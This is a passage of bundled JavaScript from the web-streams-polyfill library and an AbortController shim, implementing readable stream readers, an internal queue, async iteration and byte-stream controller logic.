    const signal = signals.get(controller);
    if (signal == null) {
        throw new TypeError(`Expected 'this' to be an 'AbortController' object, but got ${controller === null ? "null" : typeof controller}`);
    }
    return signal;
}
// Properties should be enumerable.
Object.defineProperties(AbortController.prototype, {
    signal: { enumerable: true },
    abort: { enumerable: true },
});
if (typeof Symbol === "function" && typeof Symbol.toStringTag === "symbol") {
    Object.defineProperty(AbortController.prototype, Symbol.toStringTag, {
        configurable: true,
        value: "AbortController",
    });
}

/**
 * web-streams-polyfill v3.2.1
 */
/// <reference lib="es2015.symbol" />
const SymbolPolyfill = Symbol;

/// <reference lib="dom" />
function noop() {
    return undefined;
}

function typeIsObject(x) {
    return (typeof x === 'object' && x !== null) || typeof x === 'function';
}
const rethrowAssertionErrorRejection = noop;

const originalPromise = Promise;
const originalPromiseThen = Promise.prototype.then;
const originalPromiseResolve = Promise.resolve.bind(originalPromise);
const originalPromiseReject = Promise.reject.bind(originalPromise);
function newPromise(executor) {
    return new originalPromise(executor);
}
function promiseResolvedWith(value) {
    return originalPromiseResolve(value);
}
function promiseRejectedWith(reason) {
    return originalPromiseReject(reason);
}
function PerformPromiseThen(promise, onFulfilled, onRejected) {
    // There doesn't appear to be any way to correctly emulate the behaviour from JavaScript, so this is just an
    // approximation.
    return originalPromiseThen.call(promise, onFulfilled, onRejected);
}
function uponPromise(promise, onFulfilled, onRejected) {
    PerformPromiseThen(PerformPromiseThen(promise, onFulfilled, onRejected), undefined, rethrowAssertionErrorRejection);
}
function uponFulfillment(promise, onFulfilled) {
    uponPromise(promise, onFulfilled);
}
function uponRejection(promise, onRejected) {
    uponPromise(promise, undefined, onRejected);
}
function transformPromiseWith(promise, fulfillmentHandler, rejectionHandler) {
    return PerformPromiseThen(promise, fulfillmentHandler, rejectionHandler);
}
function setPromiseIsHandledToTrue(promise) {
    PerformPromiseThen(promise, undefined, rethrowAssertionErrorRejection);
}
function reflectCall(F, V, args) {
    if (typeof F !== 'function') {
        throw new TypeError('Argument is not a function');
    }
    return Function.prototype.apply.call(F, V, args);
}
function promiseCall(F, V, args) {
    try {
        return promiseResolvedWith(reflectCall(F, V, args));
    }
    catch (value) {
        return promiseRejectedWith(value);
    }
}

// Original from Chromium
// https://chromium.googlesource.com/chromium/src/+/0aee4434a4dba42a42abaea9bfbc0cd196a63bc1/third_party/blink/renderer/core/streams/SimpleQueue.js
const QUEUE_MAX_ARRAY_SIZE = 16384;
/**
 * Simple queue structure.
 *
 * Avoids scalability issues with using a packed array directly by using
 * multiple arrays in a linked list and keeping the array size bounded.
 */
class SimpleQueue {
    constructor() {
        this._cursor = 0;
        this._size = 0;
        // _front and _back are always defined.
        this._front = {
            _elements: [],
            _next: undefined
        };
        this._back = this._front;
        // The cursor is used to avoid calling Array.shift().
        // It contains the index of the front element of the array inside the
        // front-most node. It is always in the range [0, QUEUE_MAX_ARRAY_SIZE).
        this._cursor = 0;
        // When there is only one node, size === elements.length - cursor.
        this._size = 0;
    }
    get length() {
        return this._size;
    }
    // For exception safety, this method is structured in order:
    // 1. Read state
    // 2. Calculate required state mutations
    // 3. Perform state mutations
    push(element) {
        const oldBack = this._back;
        let newBack = oldBack;
        if (oldBack._elements.length === QUEUE_MAX_ARRAY_SIZE - 1) {
            newBack = {
                _elements: [],
                _next: undefined
            };
        }
        // push() is the mutation most likely to throw an exception, so it
        // goes first.
        oldBack._elements.push(element);
        if (newBack !== oldBack) {
            this._back = newBack;
            oldBack._next = newBack;
        }
        ++this._size;
    }
    // Like push(), shift() follows the read -> calculate -> mutate pattern for
    // exception safety.
    shift() { // must not be called on an empty queue
        const oldFront = this._front;
        let newFront = oldFront;
        const oldCursor = this._cursor;
        let newCursor = oldCursor + 1;
        const elements = oldFront._elements;
        const element = elements[oldCursor];
        if (newCursor === QUEUE_MAX_ARRAY_SIZE) {
            newFront = oldFront._next;
            newCursor = 0;
        }
        // No mutations before this point.
        --this._size;
        this._cursor = newCursor;
        if (oldFront !== newFront) {
            this._front = newFront;
        }
        // Permit shifted element to be garbage collected.
        elements[oldCursor] = undefined;
        return element;
    }
    // The tricky thing about forEach() is that it can be called
    // re-entrantly. The queue may be mutated inside the callback. It is easy to
    // see that push() within the callback has no negative effects since the end
    // of the queue is checked for on every iteration. If shift() is called
    // repeatedly within the callback then the next iteration may return an
    // element that has been removed. In this case the callback will be called
    // with undefined values until we either "catch up" with elements that still
    // exist or reach the back of the queue.
    forEach(callback) {
        let i = this._cursor;
        let node = this._front;
        let elements = node._elements;
        while (i !== elements.length || node._next !== undefined) {
            if (i === elements.length) {
                node = node._next;
                elements = node._elements;
                i = 0;
                if (elements.length === 0) {
                    break;
                }
            }
            callback(elements[i]);
            ++i;
        }
    }
    // Return the element that would be returned if shift() was called now,
    // without modifying the queue.
    peek() { // must not be called on an empty queue
        const front = this._front;
        const cursor = this._cursor;
        return front._elements[cursor];
    }
}

function ReadableStreamReaderGenericInitialize(reader, stream) {
    reader._ownerReadableStream = stream;
    stream._reader = reader;
    if (stream._state === 'readable') {
        defaultReaderClosedPromiseInitialize(reader);
    }
    else if (stream._state === 'closed') {
        defaultReaderClosedPromiseInitializeAsResolved(reader);
    }
    else {
        defaultReaderClosedPromiseInitializeAsRejected(reader, stream._storedError);
    }
}
// A client of ReadableStreamDefaultReader and ReadableStreamBYOBReader may use these functions directly to bypass state
// check.
function ReadableStreamReaderGenericCancel(reader, reason) {
    const stream = reader._ownerReadableStream;
    return ReadableStreamCancel(stream, reason);
}
function ReadableStreamReaderGenericRelease(reader) {
    if (reader._ownerReadableStream._state === 'readable') {
        defaultReaderClosedPromiseReject(reader, new TypeError(`Reader was released and can no longer be used to monitor the stream's closedness`));
    }
    else {
        defaultReaderClosedPromiseResetToRejected(reader, new TypeError(`Reader was released and can no longer be used to monitor the stream's closedness`));
    }
    reader._ownerReadableStream._reader = undefined;
    reader._ownerReadableStream = undefined;
}
// Helper functions for the readers.
function readerLockException(name) {
    return new TypeError('Cannot ' + name + ' a stream using a released reader');
}
// Helper functions for the ReadableStreamDefaultReader.
function defaultReaderClosedPromiseInitialize(reader) {
    reader._closedPromise = newPromise((resolve, reject) => {
        reader._closedPromise_resolve = resolve;
        reader._closedPromise_reject = reject;
    });
}
function defaultReaderClosedPromiseInitializeAsRejected(reader, reason) {
    defaultReaderClosedPromiseInitialize(reader);
    defaultReaderClosedPromiseReject(reader, reason);
}
function defaultReaderClosedPromiseInitializeAsResolved(reader) {
    defaultReaderClosedPromiseInitialize(reader);
    defaultReaderClosedPromiseResolve(reader);
}
function defaultReaderClosedPromiseReject(reader, reason) {
    if (reader._closedPromise_reject === undefined) {
        return;
    }
    setPromiseIsHandledToTrue(reader._closedPromise);
    reader._closedPromise_reject(reason);
    reader._closedPromise_resolve = undefined;
    reader._closedPromise_reject = undefined;
}
function defaultReaderClosedPromiseResetToRejected(reader, reason) {
    defaultReaderClosedPromiseInitializeAsRejected(reader, reason);
}
function defaultReaderClosedPromiseResolve(reader) {
    if (reader._closedPromise_resolve === undefined) {
        return;
    }
    reader._closedPromise_resolve(undefined);
    reader._closedPromise_resolve = undefined;
    reader._closedPromise_reject = undefined;
}

const AbortSteps = SymbolPolyfill('[[AbortSteps]]');
const ErrorSteps = SymbolPolyfill('[[ErrorSteps]]');
const CancelSteps = SymbolPolyfill('[[CancelSteps]]');
const PullSteps = SymbolPolyfill('[[PullSteps]]');

/// <reference lib="es2015.core" />
// https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number/isFinite#Polyfill
const NumberIsFinite = Number.isFinite || function (x) {
    return typeof x === 'number' && isFinite(x);
};

/// <reference lib="es2015.core" />
// https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math/trunc#Polyfill
const MathTrunc = Math.trunc || function (v) {
    return v < 0 ? Math.ceil(v) : Math.floor(v);
};

// https://heycam.github.io/webidl/#idl-dictionaries
function isDictionary(x) {
    return typeof x === 'object' || typeof x === 'function';
}
function assertDictionary(obj, context) {
    if (obj !== undefined && !isDictionary(obj)) {
        throw new TypeError(`${context} is not an object.`);
    }
}
// https://heycam.github.io/webidl/#idl-callback-functions
function assertFunction(x, context) {
    if (typeof x !== 'function') {
        throw new TypeError(`${context} is not a function.`);
    }
}
// https://heycam.github.io/webidl/#idl-object
function isObject(x) {
    return (typeof x === 'object' && x !== null) || typeof x === 'function';
}
function assertObject(x, context) {
    if (!isObject(x)) {
        throw new TypeError(`${context} is not an object.`);
    }
}
function assertRequiredArgument(x, position, context) {
    if (x === undefined) {
        throw new TypeError(`Parameter ${position} is required in '${context}'.`);
    }
}
function assertRequiredField(x, field, context) {
    if (x === undefined) {
        throw new TypeError(`${field} is required in '${context}'.`);
    }
}
// https://heycam.github.io/webidl/#idl-unrestricted-double
function convertUnrestrictedDouble(value) {
    return Number(value);
}
function censorNegativeZero(x) {
    return x === 0 ? 0 : x;
}
function integerPart(x) {
    return censorNegativeZero(MathTrunc(x));
}
// https://heycam.github.io/webidl/#idl-unsigned-long-long
function convertUnsignedLongLongWithEnforceRange(value, context) {
    const lowerBound = 0;
    const upperBound = Number.MAX_SAFE_INTEGER;
    let x = Number(value);
    x = censorNegativeZero(x);
    if (!NumberIsFinite(x)) {
        throw new TypeError(`${context} is not a finite number`);
    }
    x = integerPart(x);
    if (x < lowerBound || x > upperBound) {
        throw new TypeError(`${context} is outside the accepted range of ${lowerBound} to ${upperBound}, inclusive`);
    }
    if (!NumberIsFinite(x) || x === 0) {
        return 0;
    }
    // TODO Use BigInt if supported?
    // let xBigInt = BigInt(integerPart(x));
    // xBigInt = BigInt.asUintN(64, xBigInt);
    // return Number(xBigInt);
    return x;
}

function assertReadableStream(x, context) {
    if (!IsReadableStream(x)) {
        throw new TypeError(`${context} is not a ReadableStream.`);
    }
}

// Abstract operations for the ReadableStream.
function AcquireReadableStreamDefaultReader(stream) {
    return new ReadableStreamDefaultReader(stream);
}
// ReadableStream API exposed for controllers.
function ReadableStreamAddReadRequest(stream, readRequest) {
    stream._reader._readRequests.push(readRequest);
}
function ReadableStreamFulfillReadRequest(stream, chunk, done) {
    const reader = stream._reader;
    const readRequest = reader._readRequests.shift();
    if (done) {
        readRequest._closeSteps();
    }
    else {
        readRequest._chunkSteps(chunk);
    }
}
function ReadableStreamGetNumReadRequests(stream) {
    return stream._reader._readRequests.length;
}
function ReadableStreamHasDefaultReader(stream) {
    const reader = stream._reader;
    if (reader === undefined) {
        return false;
    }
    if (!IsReadableStreamDefaultReader(reader)) {
        return false;
    }
    return true;
}
/**
 * A default reader vended by a {@link ReadableStream}.
 *
 * @public
 */
class ReadableStreamDefaultReader {
    constructor(stream) {
        assertRequiredArgument(stream, 1, 'ReadableStreamDefaultReader');
        assertReadableStream(stream, 'First parameter');
        if (IsReadableStreamLocked(stream)) {
            throw new TypeError('This stream has already been locked for exclusive reading by another reader');
        }
        ReadableStreamReaderGenericInitialize(this, stream);
        this._readRequests = new SimpleQueue();
    }
    /**
     * Returns a promise that will be fulfilled when the stream becomes closed,
     * or rejected if the stream ever errors or the reader's lock is released before the stream finishes closing.
     */
    get closed() {
        if (!IsReadableStreamDefaultReader(this)) {
            return promiseRejectedWith(defaultReaderBrandCheckException('closed'));
        }
        return this._closedPromise;
    }
    /**
     * If the reader is active, behaves the same as {@link ReadableStream.cancel | stream.cancel(reason)}.
     */
    cancel(reason = undefined) {
        if (!IsReadableStreamDefaultReader(this)) {
            return promiseRejectedWith(defaultReaderBrandCheckException('cancel'));
        }
        if (this._ownerReadableStream === undefined) {
            return promiseRejectedWith(readerLockException('cancel'));
        }
        return ReadableStreamReaderGenericCancel(this, reason);
    }
    /**
     * Returns a promise that allows access to the next chunk from the stream's internal queue, if available.
     *
     * If reading a chunk causes the queue to become empty, more data will be pulled from the underlying source.
     */
    read() {
        if (!IsReadableStreamDefaultReader(this)) {
            return promiseRejectedWith(defaultReaderBrandCheckException('read'));
        }
        if (this._ownerReadableStream === undefined) {
            return promiseRejectedWith(readerLockException('read from'));
        }
        let resolvePromise;
        let rejectPromise;
        const promise = newPromise((resolve, reject) => {
            resolvePromise = resolve;
            rejectPromise = reject;
        });
        const readRequest = {
            _chunkSteps: chunk => resolvePromise({ value: chunk, done: false }),
            _closeSteps: () => resolvePromise({ value: undefined, done: true }),
            _errorSteps: e => rejectPromise(e)
        };
        ReadableStreamDefaultReaderRead(this, readRequest);
        return promise;
    }
    /**
     * Releases the reader's lock on the corresponding stream. After the lock is released, the reader is no longer active.
     * If the associated stream is errored when the lock is released, the reader will appear errored in the same way
     * from now on; otherwise, the reader will appear closed.
     *
     * A reader's lock cannot be released while it still has a pending read request, i.e., if a promise returned by
     * the reader's {@link ReadableStreamDefaultReader.read | read()} method has not yet been settled. Attempting to
     * do so will throw a `TypeError` and leave the reader locked to the stream.
     */
    releaseLock() {
        if (!IsReadableStreamDefaultReader(this)) {
            throw defaultReaderBrandCheckException('releaseLock');
        }
        if (this._ownerReadableStream === undefined) {
            return;
        }
        if (this._readRequests.length > 0) {
            throw new TypeError('Tried to release a reader lock when that reader has pending read() calls un-settled');
        }
        ReadableStreamReaderGenericRelease(this);
    }
}
Object.defineProperties(ReadableStreamDefaultReader.prototype, {
    cancel: { enumerable: true },
    read: { enumerable: true },
    releaseLock: { enumerable: true },
    closed: { enumerable: true }
});
// Abstract operations for the readers.
function IsReadableStreamDefaultReader(x) {
    if (!typeIsObject(x)) {
        return false;
    }
    if (!Object.prototype.hasOwnProperty.call(x, '_readRequests')) {
        return false;
    }
    return x instanceof ReadableStreamDefaultReader;
}
function ReadableStreamDefaultReaderRead(reader, readRequest) {
    const stream = reader._ownerReadableStream;
    stream._disturbed = true;
    if (stream._state === 'closed') {
        readRequest._closeSteps();
    }
    else if (stream._state === 'errored') {
        readRequest._errorSteps(stream._storedError);
    }
    else {
        stream._readableStreamController[PullSteps](readRequest);
    }
}
// Helper functions for the ReadableStreamDefaultReader.
function defaultReaderBrandCheckException(name) {
    return new TypeError(`ReadableStreamDefaultReader.prototype.${name} can only be used on a ReadableStreamDefaultReader`);
}

/// <reference lib="es2018.asynciterable" />
class ReadableStreamAsyncIteratorImpl {
    constructor(reader, preventCancel) {
        this._ongoingPromise = undefined;
        this._isFinished = false;
        this._reader = reader;
        this._preventCancel = preventCancel;
    }
    next() {
        const nextSteps = () => this._nextSteps();
        this._ongoingPromise = this._ongoingPromise ?
            transformPromiseWith(this._ongoingPromise, nextSteps, nextSteps) :
            nextSteps();
        return this._ongoingPromise;
    }
    return(value) {
        const returnSteps = () => this._returnSteps(value);
        return this._ongoingPromise ?
            transformPromiseWith(this._ongoingPromise, returnSteps, returnSteps) :
            returnSteps();
    }
    _nextSteps() {
        if (this._isFinished) {
            return Promise.resolve({ value: undefined, done: true });
        }
        const reader = this._reader;
        if (reader._ownerReadableStream === undefined) {
            return promiseRejectedWith(readerLockException('iterate'));
        }
        let resolvePromise;
        let rejectPromise;
        const promise = newPromise((resolve, reject) => {
            resolvePromise = resolve;
            rejectPromise = reject;
        });
        const readRequest = {
            _chunkSteps: chunk => {
                this._ongoingPromise = undefined;
                // This needs to be delayed by one microtask, otherwise we stop pulling too early which breaks a test.
                // FIXME Is this a bug in the specification, or in the test?
                queueMicrotask(() => resolvePromise({ value: chunk, done: false }));
            },
            _closeSteps: () => {
                this._ongoingPromise = undefined;
                this._isFinished = true;
                ReadableStreamReaderGenericRelease(reader);
                resolvePromise({ value: undefined, done: true });
            },
            _errorSteps: reason => {
                this._ongoingPromise = undefined;
                this._isFinished = true;
                ReadableStreamReaderGenericRelease(reader);
                rejectPromise(reason);
            }
        };
        ReadableStreamDefaultReaderRead(reader, readRequest);
        return promise;
    }
    _returnSteps(value) {
        if (this._isFinished) {
            return Promise.resolve({ value, done: true });
        }
        this._isFinished = true;
        const reader = this._reader;
        if (reader._ownerReadableStream === undefined) {
            return promiseRejectedWith(readerLockException('finish iterating'));
        }
        if (!this._preventCancel) {
            const result = ReadableStreamReaderGenericCancel(reader, value);
            ReadableStreamReaderGenericRelease(reader);
            return transformPromiseWith(result, () => ({ value, done: true }));
        }
        ReadableStreamReaderGenericRelease(reader);
        return promiseResolvedWith({ value, done: true });
    }
}
const ReadableStreamAsyncIteratorPrototype = {
    next() {
        if (!IsReadableStreamAsyncIterator(this)) {
            return promiseRejectedWith(streamAsyncIteratorBrandCheckException('next'));
        }
        return this._asyncIteratorImpl.next();
    },
    return(value) {
        if (!IsReadableStreamAsyncIterator(this)) {
            return promiseRejectedWith(streamAsyncIteratorBrandCheckException('return'));
        }
        return this._asyncIteratorImpl.return(value);
    }
};
// Abstract operations for the ReadableStream.
function AcquireReadableStreamAsyncIterator(stream, preventCancel) {
    const reader = AcquireReadableStreamDefaultReader(stream);
    const impl = new ReadableStreamAsyncIteratorImpl(reader, preventCancel);
    const iterator = Object.create(ReadableStreamAsyncIteratorPrototype);
    iterator._asyncIteratorImpl = impl;
    return iterator;
}
function IsReadableStreamAsyncIterator(x) {
    if (!typeIsObject(x)) {
        return false;
    }
    if (!Object.prototype.hasOwnProperty.call(x, '_asyncIteratorImpl')) {
        return false;
    }
    try {
        // noinspection SuspiciousTypeOfGuard
        return x._asyncIteratorImpl instanceof
            ReadableStreamAsyncIteratorImpl;
    }
    catch (_a) {
        return false;
    }
}
// Helper functions for the ReadableStream.
function streamAsyncIteratorBrandCheckException(name) {
    return new TypeError(`ReadableStreamAsyncIterator.${name} can only be used on a ReadableSteamAsyncIterator`);
}

/// <reference lib="es2015.core" />
// https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number/isNaN#Polyfill
const NumberIsNaN = Number.isNaN || function (x) {
    // eslint-disable-next-line no-self-compare
    return x !== x;
};

function CreateArrayFromList(elements) {
    // We use arrays to represent lists, so this is basically a no-op.
    // Do a slice though just in case we happen to depend on the unique-ness.
    return elements.slice();
}
function CopyDataBlockBytes(dest, destOffset, src, srcOffset, n) {
    new Uint8Array(dest).set(new Uint8Array(src, srcOffset, n), destOffset);
}
// Not implemented correctly
function TransferArrayBuffer(O) {
    return O;
}
// Not implemented correctly
// eslint-disable-next-line @typescript-eslint/no-unused-vars
function IsDetachedBuffer(O) {
    return false;
}
function ArrayBufferSlice(buffer, begin, end) {
    // ArrayBuffer.prototype.slice is not available on IE10
    // https://www.caniuse.com/mdn-javascript_builtins_arraybuffer_slice
    if (buffer.slice) {
        return buffer.slice(begin, end);
    }
    const length = end - begin;
    const slice = new ArrayBuffer(length);
    CopyDataBlockBytes(slice, 0, buffer, begin, length);
    return slice;
}

function IsNonNegativeNumber(v) {
    if (typeof v !== 'number') {
        return false;
    }
    if (NumberIsNaN(v)) {
        return false;
    }
    if (v < 0) {
        return false;
    }
    return true;
}
function CloneAsUint8Array(O) {
    const buffer = ArrayBufferSlice(O.buffer, O.byteOffset, O.byteOffset + O.byteLength);
    return new Uint8Array(buffer);
}

function DequeueValue(container) {
    const pair = container._queue.shift();
    container._queueTotalSize -= pair.size;
    if (container._queueTotalSize < 0) {
        container._queueTotalSize = 0;
    }
    return pair.value;
}
function EnqueueValueWithSize(container, value, size) {
    if (!IsNonNegativeNumber(size) || size === Infinity) {
        throw new RangeError('Size must be a finite, non-NaN, non-negative number.');
    }
    container._queue.push({ value, size });
    container._queueTotalSize += size;
}
function PeekQueueValue(container) {
    const pair = container._queue.peek();
    return pair.value;
}
function ResetQueue(container) {
    container._queue = new SimpleQueue();
    container._queueTotalSize = 0;
}

/**
 * A pull-into request in a {@link ReadableByteStreamController}.
 *
 * @public
 */
class ReadableStreamBYOBRequest {
    constructor() {
        throw new TypeError('Illegal constructor');
    }
    /**
     * Returns the view for writing in to, or `null` if the BYOB request has already been responded to.
     */
    get view() {
        if (!IsReadableStreamBYOBRequest(this)) {
            throw byobRequestBrandCheckException('view');
        }
        return this._view;
    }
    respond(bytesWritten) {
        if (!IsReadableStreamBYOBRequest(this)) {
            throw byobRequestBrandCheckException('respond');
        }
        assertRequiredArgument(bytesWritten, 1, 'respond');
        bytesWritten = convertUnsignedLongLongWithEnforceRange(bytesWritten, 'First parameter');
        if (this._associatedReadableByteStreamController === undefined) {
            throw new TypeError('This BYOB request has been invalidated');
        }
        if (IsDetachedBuffer(this._view.buffer)) ;
        ReadableByteStreamControllerRespond(this._associatedReadableByteStreamController, bytesWritten);
    }
    respondWithNewView(view) {
        if (!IsReadableStreamBYOBRequest(this)) {
            throw byobRequestBrandCheckException('respondWithNewView');
        }
        assertRequiredArgument(view, 1, 'respondWithNewView');
        if (!ArrayBuffer.isView(view)) {
            throw new TypeError('You can only respond with array buffer views');
        }
        if (this._associatedReadableByteStreamController === undefined) {
            throw new TypeError('This BYOB request has been invalidated');
        }
        if (IsDetachedBuffer(view.buffer)) ;
        ReadableByteStreamControllerRespondWithNewView(this._associatedReadableByteStreamController, view);
    }
}
Object.defineProperties(ReadableStreamBYOBRequest.prototype, {
    respond: { enumerable: true },
    respondWithNewView: { enumerable: true },
    view: { enumerable: true }
});
/**
 * Allows control of a {@link ReadableStream | readable byte stream}'s state and internal queue.
 *
 * @public
 */
class ReadableByteStreamController {
    constructor() {
        throw new TypeError('Illegal constructor');
    }
    /**
     * Returns the current BYOB pull request, or `null` if there isn't one.
     */
    get byobRequest() {
        if (!IsReadableByteStreamController(this)) {
            throw byteStreamControllerBrandCheckException('byobRequest');
        }
        return ReadableByteStreamControllerGetBYOBRequest(this);
    }
    /**
     * Returns the desired size to fill the controlled stream's internal queue. It can be negative, if the queue is
     * over-full. An underlying byte source ought to use this information to determine when and how to apply backpressure.
     */
    get desiredSize() {
        if (!IsReadableByteStreamController(this)) {
            throw byteStreamControllerBrandCheckException('desiredSize');
        }
        return ReadableByteStreamControllerGetDesiredSize(this);
    }
    /**
     * Closes the controlled readable stream. Consumers will still be able to read any previously-enqueued chunks from
     * the stream, but once those are read, the stream will become closed.
     */
    close() {
        if (!IsReadableByteStreamController(this)) {
            throw byteStreamControllerBrandCheckException('close');
        }
        if (this._closeRequested) {
            throw new TypeError('The stream has already been closed; do not close it again!');
        }
        const state = this._controlledReadableByteStream._state;
        if (state !== 'readable') {
            throw new TypeError(`The stream (in ${state} state) is not in the readable state and cannot be closed`);
        }
        ReadableByteStreamControllerClose(this);
    }
    enqueue(chunk) {
        if (!IsReadableByteStreamController(this)) {
            throw byteStreamControllerBrandCheckException('enqueue');
        }
        assertRequiredArgument(chunk, 1, 'enqueue');
        if (!ArrayBuffer.isView(chunk)) {
            throw new TypeError('chunk must be an array buffer view');
        }
        if (chunk.byteLength === 0) {
            throw new TypeError('chunk must have non-zero byteLength');
        }
        if (chunk.buffer.byteLength === 0) {
            throw new TypeError(`chunk's buffer must have non-zero byteLength`);
        }
        if (this._closeRequested) {
            throw new TypeError('stream is closed or draining');
        }
        const state = this._controlledReadableByteStream._state;
        if (state !== 'readable') {
            throw new TypeError(`The stream (in ${state} state) is not in the readable state and cannot be enqueued to`);
        }
        ReadableByteStreamControllerEnqueue(this, chunk);
    }
    /**
     * Errors the controlled readable stream, making all future interactions with it fail with the given error `e`.
     */
    error(e = undefined) {
        if (!IsReadableByteStreamController(this)) {
            throw byteStreamControllerBrandCheckException('error');
        }
        ReadableByteStreamControllerError(this, e);
    }
    /** @internal */
    [CancelSteps](reason) {
        ReadableByteStreamControllerClearPendingPullIntos(this);
        ResetQueue(this);
        const result = this._cancelAlgorithm(reason);
        ReadableByteStreamControllerClearAlgorithms(this);
        return result;
    }
    /** @internal */
    [PullSteps](readRequest) {
        const stream = this._controlledReadableByteStream;
        if (this._queueTotalSize > 0) {
            const entry = this._queue.shift();
            this._queueTotalSize -= entry.byteLength;
            ReadableByteStreamControllerHandleQueueDrain(this);
            const view = new Uint8Array(entry.buffer, entry.byteOffset, entry.byteLength);
            readRequest._chunkSteps(view);
            return;
        }
        const autoAllocateChunkSize = this._autoAllocateChunkSize;
        if (autoAllocateChunkSize !== undefined) {
            let buffer;
            try {
                buffer = new ArrayBuffer(autoAllocateChunkSize);
            }
            catch (bufferE) {
                readRequest._errorSteps(bufferE);
                return;
            }
            const pullIntoDescriptor = {
                buffer,
                bufferByteLength: autoAllocateChunkSize,
                byteOffset: 0,
                byteLength: autoAllocateChunkSize,
                bytesFilled: 0,
                elementSize: 1,
                viewConstructor: Uint8Array,
                readerType: 'default'
            };
            this._pendingPullIntos.push(pullIntoDescriptor);
        }
        ReadableStreamAddReadRequest(stream, readRequest);
        ReadableByteStreamControllerCallPullIfNeeded(this);
    }
}
Object.defineProperties(ReadableByteStreamController.prototype, {
    close: { enumerable: true },
    enqueue: { enumerable: true },
    error: { enumerable: true },
    byobRequest: { enumerable: true },
    desiredSize: { enumerable: true }
});
// Abstract operations for the ReadableByteStreamController.
function IsReadableByteStreamController(x) {
    if (!typeIsObject(x)) {
        return false;
    }
    if (!Object.prototype.hasOwnProperty.call(x, '_controlledReadableByteStream')) {
        return false;
    }
    return x instanceof ReadableByteStreamController;
}
function IsReadableStreamBYOBRequest(x) {
    if (!typeIsObject(x)) {
        return false;
    }
    if (!Object.prototype.hasOwnProperty.call(x, '_associatedReadableByteStreamController')) {
        return false;
    }
    return x instanceof ReadableStreamBYOBRequest;
}
function ReadableByteStreamControllerCallPullIfNeeded(controller) {
    const shouldPull = ReadableByteStreamControllerShouldCallPull(controller);
    if (!shouldPull) {
        return;
    }
    if (controller._pulling) {
        controller._pullAgain = true;
        return;
    }
    controller._pulling = true;
    // TODO: Test controller argument
    const pullPromise = controller._pullAlgorithm();
    uponPromise(pullPromise, () => {
        controller._pulling = false;
        if (controller._pullAgain) {
            controller._pullAgain = false;
            ReadableByteStreamControllerCallPullIfNeeded(controller);
        }
    }, e => {
        ReadableByteStreamControllerError(controller, e);
    });
}
function ReadableByteStreamControllerClearPendingPullIntos(controller) {
    ReadableByteStreamControllerInvalidateBYOBRequest(controller);
    controller._pendingPullIntos = new SimpleQueue();
}
function ReadableByteStreamControllerCommitPullIntoDescriptor(stream, pullIntoDescriptor) {
    let done = false;
    if (stream._state === 'closed') {
        done = true;
    }
    const filledView = ReadableByteStreamControllerConvertPullIntoDescriptor(pullIntoDescriptor);
    if (pullIntoDescriptor.readerType === 'default') {
        ReadableStreamFulfillReadRequest(stream, filledView, done);
    }
    else {
        ReadableStreamFulfillReadIntoRequest(stream, filledView, done);
    }
}
function ReadableByteStreamControllerConvertPullIntoDescriptor(pullIntoDescriptor) {
    const bytesFilled = pullIntoDescriptor.bytesFilled;
    const elementSize = pullIntoDescriptor.elementSize;
    return new pullIntoDescriptor.viewConstructor(pullIntoDescriptor.buffer, pullIntoDescriptor.byteOffset, bytesFilled / elementSize);
}
function ReadableByteStreamControllerEnqueueChunkToQueue(controller, buffer, byteOffset, byteLength) {
    controller._queue.push({ buffer, byteOffset, byteLength });
    controller._queueTotalSize += byteLength;
}
function ReadableByteStreamControllerFillPullIntoDescriptorFromQueue(controller, pullIntoDescriptor) {
    const elementSize = pullIntoDescriptor.elementSize;
    const currentAlignedBytes = pullIntoDescriptor.bytesFilled - pullIntoDescriptor.bytesFilled % elementSize;
    const maxBytesToCopy = Math.min(controller._queueTotalSize, pullIntoDescriptor.byteLength - pullIntoDescriptor.bytesFilled);
    const maxBytesFilled = pullIntoDescriptor.bytesFilled + maxBytesToCopy;
    const maxAlignedBytes = maxBytesFilled - maxBytesFilled % elementSize;
    let totalBytesToCopyRemaining = maxBytesToCopy;
    let ready = false;
    if (maxAlignedBytes > currentAlignedBytes) {
        totalBytesToCopyRemaining = maxAlignedBytes - pullIntoDescriptor.bytesFilled;
        ready = true;
    }
    const queue = controller._queue;
    while (totalBytesToCopyRemaining > 0) {
        const headOfQueue = queue.peek();
        const bytesToCopy = Math.min(totalBytesToCopyRemaining, headOfQueue.byteLength);
        const destStart = pullIntoDescriptor.byteOffset + pullIntoDescriptor.bytesFilled;
        CopyDataBlockBytes(pullIntoDescriptor.buffer, destStart, headOfQueue.buffer, headOfQueue.byteOffset, bytesToCopy);
        if (headOfQueue.byteLength === bytesToCopy) {
            queue.shift();
        }
        else {
            headOfQueue.byteOffset += bytesToCopy;
            headOfQueue.byteLength -= bytesToCopy;
        }
        controller._queueTotalSize -= bytesToCopy;
        ReadableByteStreamControllerFillHeadPullIntoDescriptor(controller, bytesToCopy, pullIntoDescriptor);
        totalBytesToCopyRemaining -= bytesToCopy;
    }
    return ready;
}
function ReadableByteStreamControllerFillHeadPullIntoDescriptor(controller, size, pullIntoDescriptor) {
    pullIntoDescriptor.bytesFilled += size;
}
function ReadableByteStreamControllerHandleQueueDrain(controller) {
    if (controller._queueTotalSize === 0 && controller._closeRequested) {
        ReadableByteStreamControllerClearAlgorithms(controller);
        ReadableStreamClose(controller._controlledReadableByteStream);
    }
    else {
        ReadableByteStreamControllerCallPullIfNeeded(controller);
    }
}
function ReadableByteStreamControllerInvalidateBYOBRequest(controller) {
    if (controller._byobRequest === null) {
        return;
    }
    controller._byobRequest._associatedReadableByteStreamController = undefined;
    controller._byobRequest._view = null;
    controller._byobRequest = null;
}
function ReadableByteStreamControllerProcessPullIntoDescriptorsUsingQueue(controller) {
    while (controller._pendingPullIntos.length > 0) {
        if (controller._queueTotalSize === 0) {
            return;
        }
        const pullIntoDescriptor = controller._pendingPullIntos.peek();
        if (ReadableByteStreamControllerFillPullIntoDescriptorFromQueue(controller, pullIntoDescriptor)) {
            ReadableByteStreamControllerShiftPendingPullInto(controller);
            ReadableByteStreamControllerCommitPullIntoDescriptor(controller._controlledReadableByteStream, pullIntoDescriptor);
        }
    }
}
function ReadableByteStreamControllerPullInto(controller, view, readIntoRequest) {
    const stream = controller._controlledReadableByteStream;
    let elementSize = 1;
    if (view.constructor !== DataView) {
        elementSize = view.constructor.BYTES_PER_ELEMENT;
    }
    const ctor = view.constructor;
    // try {
